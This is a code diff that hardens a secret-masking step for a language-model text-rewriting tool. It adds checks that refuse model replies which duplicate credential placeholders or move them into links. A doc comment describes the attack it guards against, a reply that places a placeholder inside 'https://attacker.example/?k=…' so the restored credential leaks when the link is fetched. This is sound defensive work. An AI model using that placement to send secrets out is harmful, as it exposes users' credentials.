@@ -45,7 +45,11 @@ export type SecretMasking = {
   salt: string;
 };
 
-export type SecretRestoreFailure = "placeholder-missing" | "placeholder-residue";
+export type SecretRestoreFailure =
+  | "placeholder-missing"
+  | "placeholder-residue"
+  | "placeholder-multiplicity"
+  | "placeholder-relocated";
 
 export type SecretRestoreResult =
   | { ok: true; text: string }
@@ -121,14 +125,39 @@ export const maskSecrets = (text: string, options?: MaskSecretsOptions): SecretM
   };
 };
 
-const countOccurrences = (haystack: string, needle: string): number => {
-  let count = 0;
+const occurrenceIndexes = (haystack: string, needle: string): number[] => {
+  const indexes: number[] = [];
   let index = haystack.indexOf(needle);
   while (index !== -1) {
-    count += 1;
+    indexes.push(index);
     index = haystack.indexOf(needle, index + needle.length);
   }
-  return count;
+  return indexes;
+};
+
+const countOccurrences = (haystack: string, needle: string): number =>
+  occurrenceIndexes(haystack, needle).length;
+
+/**
+ * Whether the whitespace-delimited token containing `index` reads as a link
+ * target — a URL (`https://…`, `postgres://…`) or a markdown link
+ * destination (`](…)`).
+ *
+ * This is the shape of the attack it exists to catch: a reply that puts a
+ * placeholder somewhere the restored credential would be TRANSMITTED rather
+ * than merely displayed, since a link is unfurled, previewed or fetched by
+ * many of the apps FixLang pastes into. Nothing else about the reply's
+ * structure can be constrained — a rewrite is allowed to move text around,
+ * that being the point of the request.
+ */
+const isInsideLinkToken = (text: string, index: number): boolean => {
+  let start = index;
+  while (start > 0 && !/\s/.test(text[start - 1] ?? "")) start -= 1;
+  let end = index;
+  while (end < text.length && !/\s/.test(text[end] ?? "")) end += 1;
+
+  const token = text.slice(start, end);
+  return token.includes("://") || token.slice(0, index - start).includes("](");
 };
 
 /**
@@ -140,27 +169,70 @@ const countOccurrences = (haystack: string, needle: string): number => {
  *    re-bracketed placeholder counts as MISSING — the same refusal to be
  *    lenient `parseReply.ts` makes, and for the same reason: if the model
  *    rewrote the placeholder, there is no evidence it left anything else alone.
- * 2. Residue: the salted marker must not survive anywhere, which catches
+ * 2. MULTIPLICITY: each placeholder must appear exactly as many times as it
+ *    did in the text that was sent. The provider never saw the credential, but
+ *    it does control where its placeholder lands, and restoration is what turns
+ *    that control into the real value in the user's document. A reply that
+ *    duplicates a placeholder materializes the secret somewhere the user's own
+ *    text never had one, so it is refused rather than pasted.
+ * 3. RELOCATION: no occurrence may sit inside a link token unless the sent text
+ *    already had that placeholder inside one. This is the concrete attack the
+ *    count check alone does not stop — a reply that keeps the count at one but
+ *    moves the placeholder into `https://attacker.example/?k=…`, which the
+ *    receiving app then unfurls. A credential that legitimately lived in a URL
+ *    (`postgres://user:pw@host/db`) is unaffected, because the comparison is
+ *    against where it was, not against a blanket ban.
+ * 4. Residue: the salted marker must not survive anywhere, which catches
  *    mangled placeholders that counting alone misses. Compared CASE-FOLDED,
  *    unlike step 1: a model that echoes one placeholder correctly and repeats
  *    it lowercased passes the count, and the lowercased copy would then be
  *    pasted into the user's document under an all-or-nothing "ok". No
  *    legitimate text contains `fixlang_secret_<salt>` in any casing.
- * 3. Replacement via `split(placeholder).join(value)`, NEVER
+ * 5. Replacement via `split(placeholder).join(value)`, NEVER
  *    `String.replaceAll` — the latter interprets `$&`, `$1` and `$'` in the
  *    REPLACEMENT, so a secret containing them would be silently corrupted and
  *    then pasted over the user's real selection in a third-party app.
+ *
+ * Every failure funnels to the same place: `resolveSecretGuardOutputMode`
+ * forces the popup and nothing is pasted. Refusing costs the user a paste;
+ * accepting costs them the credential.
  */
 export const restoreSecrets = (reply: string, masking: SecretMasking): SecretRestoreResult => {
   if (masking.replacements.size === 0) {
     return { ok: true, text: reply };
   }
 
-  const missingCount = [...masking.replacements.keys()].filter(
+  const placeholders = [...masking.replacements.keys()];
+
+  const missingCount = placeholders.filter(
     (placeholder) => countOccurrences(reply, placeholder) === 0,
   ).length;
   if (missingCount > 0) {
     return { ok: false, reason: "placeholder-missing", missingCount };
+  }
+
+  const multiplicityMismatchCount = placeholders.filter(
+    (placeholder) =>
+      countOccurrences(reply, placeholder) !==
+      countOccurrences(masking.maskedText, placeholder),
+  ).length;
+  if (multiplicityMismatchCount > 0) {
+    return {
+      ok: false,
+      reason: "placeholder-multiplicity",
+      missingCount: multiplicityMismatchCount,
+    };
+  }
+
+  const relocatedCount = placeholders.filter((placeholder) => {
+    const wasInLink = occurrenceIndexes(masking.maskedText, placeholder).some((index) =>
+      isInsideLinkToken(masking.maskedText, index),
+    );
+    if (wasInLink) return false;
+    return occurrenceIndexes(reply, placeholder).some((index) => isInsideLinkToken(reply, index));
+  }).length;
+  if (relocatedCount > 0) {
+    return { ok: false, reason: "placeholder-relocated", missingCount: relocatedCount };
   }
 
   const restored = [...masking.replacements.entries()].reduce(
